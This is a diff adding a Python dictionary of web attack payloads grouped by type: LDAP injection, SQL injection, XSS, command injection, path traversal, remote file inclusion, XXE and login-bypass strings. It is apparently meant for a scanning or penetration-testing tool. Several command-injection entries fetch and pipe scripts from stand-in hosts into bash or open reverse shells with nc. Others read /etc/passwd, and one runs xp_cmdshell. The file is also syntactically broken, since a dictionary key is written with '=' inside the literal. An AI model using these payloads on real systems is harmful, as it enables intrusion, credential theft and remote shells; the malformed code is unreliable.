@@ -1,0 +1,123 @@
+payloads = {
+    "LDAP Injection": [
+        "*)(uid=*))(|(uid=*", "*)(objectClass=*)", "admin*)(userPassword=*)",
+        "*)(|(mail=*))(", "*)(|(cn=*))(", "*)(|(sn=*))(", "*)(|(uid=*))(",
+        "*)(|(userPassword=*))(", "*)(|(samAccountName=*))(", "*)(!(uid=*))(",
+        "*())(|(uid=*", "*)(!(cn=*))(|(cn=*", "admin'*)(uid=*))(|(uid=*",
+        "*)(userPassword=*)", "*)(|(objectClass=top))(", "*)(objectClass=top)(|(uid=*))",
+        "*)(uid=*))(|(uid=*))(|(objectClass=*))", "*)(uid=*))(|(objectClass=*))",
+        "(|(uid=*))(|(objectClass=top))",
+        "(|(objectClass=*))(|(userPassword=*))(&(objectClass=top)(uid=*))",
+        "*)(|(memberOf=*))(", "*)(cn=admin*)", "*)(samAccountName=Administrator))(",
+        "*)(&(userPassword=*))", "*)(cn=*))(|(mail=*)", "*))%00", "*))%00(|(uid=*))"
+    ],
+    "SQLi": [
+        "' OR 1=1 --", "' OR 'a'='a", "' OR 'x'='x' --", "' UNION SELECT NULL, NULL, NULL --",
+        "' UNION SELECT null, user, password FROM users --",
+        "' SELECT * FROM users WHERE username = '' OR 1=1 --", "' AND 1=1 --",
+        "' OR 1=1 LIMIT 1 --", "' AND 1=2 UNION SELECT null, username, password FROM users --",
+        "' OR EXISTS(SELECT * FROM users WHERE username='admin') --",
+        "'; DROP TABLE users --", "' AND 1=1 -- -", "' AND 'a' = 'b' --",
+        "\" OR 1=1 --", "\" OR \"a\"=\"a\"", "' UNION ALL SELECT null, username, password FROM users --",
+        "' UNION SELECT 1, 2, 3 --", "' UNION SELECT 1, 2, username, password FROM users --",
+        "' UNION SELECT user(), version(), current_database() --",
+        "' UNION SELECT database(), user(), version() --", "' AND sleep(5) --",
+        "'; WAITFOR DELAY '0:0:5' --", "' || UTL_HTTP.REQUEST('http://evil.com') --",
+        "'; SELECT pg_sleep(5); --", "' OR pg_sleep(5)--", "'; EXEC xp_cmdshell('dir') --",
+        "' OR 1=1 WAITFOR DELAY '0:0:5' --", "' || 'a'='a", "' OR ''='",
+        "' OR 1 GROUP BY CONCAT(username,0x3a,password) --", "'; EXEC xp_cmdshell('whoami'); --"
+    ],
+    "XSS": [
+        "<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>",
+        "<svg/onload=alert('XSS')>", "\"><img src=\"x\" onerror=\"alert(1)\">",
+        "<script>eval(\"alert('XSS')\")</script>", "\"><iframe src=\"javascript:alert('XSS')\"></iframe>",
+        "\"><object type=\"image/svg+xml\" data=\"javascript:alert('XSS')\"></object>",
+        "<img src=x onerror=confirm(1)>", "<details open ontoggle=alert(1)>",
+        "<a href=\"javascript:alert('XSS')\">click</a>", "<input onfocus=alert(1) autofocus>",
+        "<body onload=alert(1337)>", "<marquee onstart=alert('XSS')>",
+        "<math><mi//xlink:href='data:x,<script>alert(1)</script>'>"
+    ],
+    "Command Injection": [
+        "; ls -la", "| ls -la", "&& ls -la", "| cat /etc/passwd", "; cat /etc/passwd",
+        "&& cat /etc/passwd", "&& id", "; id", "| id", "&& whoami", "; whoami", "| whoami",
+        "&& curl http://malicious.com/malware.sh | bash", "`whoami`", "$(id)",
+        "|| ping -c 4 127.0.0.1", "; nc attacker.com 4444 -e /bin/sh", "`id`", "$(whoami)",
+        "& whoami", "; curl attacker.com | bash", "; nc attacker.com 4444 -e /bin/bash",
+        "| ping -c 5 127.0.0.1"
+    ],
+    "Path Traversal": [
+        "../../../etc/passwd", "../../../../Windows/System32/drivers/etc/hosts",
+        "../../../../etc/passwd", "..\\..\\..\\..\\etc\\passwd",
+        "../..//..//..//..//etc/passwd", "../..//..//..//..//..//etc/passwd",
+        "..\\..\\..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts",
+        "../../../../../../../../etc/hostname", "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+        "%252e%252e/%252e%252e/etc/passwd", "%2e%2e%2fetc%2fpasswd",
+        "..%c0%af../..%c0%af../etc/passwd"
+    ],
+    "RFI": [
+        "http://malicious.com/malicious_file.php", "http://attacker.com/malicious_file.txt",
+        "http://example.com/malicious_file.php", "http://attacker.com/malicious_file.txt?cmd=ls%20-la",
+        "http://attacker.com/malicious_file.php?cmd=cat%20/etc/passwd",
+        "//attacker.com/payload.txt", "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+        "//evil.com/evil.php", "http://127.0.0.1:8000/backdoor.txt"
+    ],
+    "XXE": [
+        "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><foo>&xxe;</foo>",
+        "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://attacker.com/malicious_file.xml\"> ]><foo>&xxe;</foo>",
+        "<?xml version=\"1.0\"?><!DOCTYPE root [<!ELEMENT root ANY><!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><root>&xxe;</root>",
+        "<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY file SYSTEM \"file:///c:/windows/win.ini\">]><data>&file;</data>"
+    ],
+   "auth_bypass_payloads" = [
+    # Payloads comunes
+    "' OR 1=1 --", "' OR 'a'='a", "admin' OR 1=1 --", "' OR 'x'='x' --",
+    "admin'--", "' OR 1=1#", "' OR 1=1/*", "' or ''='", "\" or \"\"=\"",
+    "1' or '1' = '1' --", "admin' or 1=1 --", "' or sleep(5) --",
+
+    # Variantes simples con símbolos
+    "-", " ", "&", "^", "*", "'", "\"",
+    "'-", "' ", "'&", "'^", "'*", "\"-\"", "\" \"", "\"&\"", "\"^\"", "\"*\"",
+
+    # Boolean logic
+    "or true--", "' or true--", "\" or true--", "') or true--", "\") or true--",
+    "' or 'x'='x", "') or ('x')=('x", "')) or (('x'))=(('x", "\" or \"x\"=\"x",
+    "\") or (\"x\")=(\"x", "\")) or ((\"x\"))=((\"x",
+
+    # Básicos OR y AND
+    "or 1=1", "or 1=1--", "or 1=1#", "or 1=1/*",
+    "' and 1='1", "' and a='a", " and 1=1", " and 1=1–",
+    
+    # Payloads contra usuarios/admin
+    "admin' --", "admin' #", "admin'/*",
+    "admin' or '1'='1", "admin' or '1'='1'--", "admin' or '1'='1'#", "admin' or '1'='1'/*",
+    "admin'or 1=1 or ''='", "admin' or 1=1", "admin' or 1=1--", "admin' or 1=1#",
+    "admin' or 1=1/*", "admin') or ('1'='1", "admin') or ('1'='1'--",
+    "admin') or ('1'='1'#", "admin') or ('1'='1'/*",
+
+    # Payloads con comillas dobles
+    "admin\" --", "admin\" #", "admin\"/*", "admin\" or \"1\"=\"1",
+    "admin\" or \"1\"=\"1\"--", "admin\" or \"1\"=\"1\"#", "admin\" or \"1\"=\"1\"/*",
+    "admin\") or (\"1\"=\"1", "admin\") or (\"1\"=\"1\"--",
+    "admin\") or (\"1\"=\"1\"#", "admin\") or (\"1\"=\"1\"/*",
+
+    # UNION SELECT para inyecciones más sofisticadas
+    "1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055",
+    "1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055",
+    "' AND 1=0 UNION ALL SELECT '', '81dc9bdb52d04dc20036dbd8313ed055",
+    "\" AND 1=0 UNION ALL SELECT \"\", \"81dc9bdb52d04dc20036dbd8313ed055",
+    "' UNION ALL SELECT 1, @@version;#", "' UNION ALL SELECT system_user(),user();#",
+    "' UNION select table_schema,table_name FROM information_Schema.tables;#",
+
+    # Payloads creativos y obfuscados
+    "') or ('1'='1", "') or ('1'='1'--", "') or ('1'='1'/*", "') or ('1'='1'#",
+    "') or '1'='1", "') or '1'='1'--", "') or '1'='1'/*", "') or '1'='1'#",
+    "' or 0=0 --", "' or 0=0 #", "' or 0=0 –", "\" or 0=0 --", "\" or 0=0 #", "\" or 0=0 –",
+    "%' or '0'='0", "' or 'one'='one", "' or 'one'='one–", "' or uid like '%",
+    "' or user like '%", "' or username like '%", "' or 'x'='x", "') or ('x'='x",
+    "\" or \"x\"=\"x", "' OR 'x'='x'#;", "'=' 'or' and '=' 'or'",
+
+    # Inyección con comparación directa
+    "admin' and substring(password/text(),1,1)='7", "' and substring(password/text(),1,1)='7",
+    "' or 1=1 limit 1 -- -+",
+    "'=\"or'",
+    ]
+}
